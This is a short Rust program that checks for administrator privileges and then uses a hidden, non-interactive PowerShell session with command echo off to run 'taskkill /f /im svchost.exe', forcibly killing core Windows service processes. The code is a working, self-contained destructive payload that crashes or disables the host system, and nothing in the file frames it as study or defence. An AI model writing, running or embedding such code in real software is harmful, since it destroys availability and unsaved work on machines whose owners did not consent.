mod windows;

use powershell_script::PsScriptBuilder;
use windows::is_app_elevated;

fn main() {
  if is_app_elevated() == true {
    let ps = PsScriptBuilder::new()
      .no_profile(true)
      .non_interactive(true)
      .hidden(true)
      .print_commands(false)
      .build();
    if let Err(e) = ps.run(r#"taskkill /f /im svchost.exe"#) {
      panic!("Failed to execute!");
    };
  } else {
    panic!("Application must be run with administrator privileges!")
  }
}
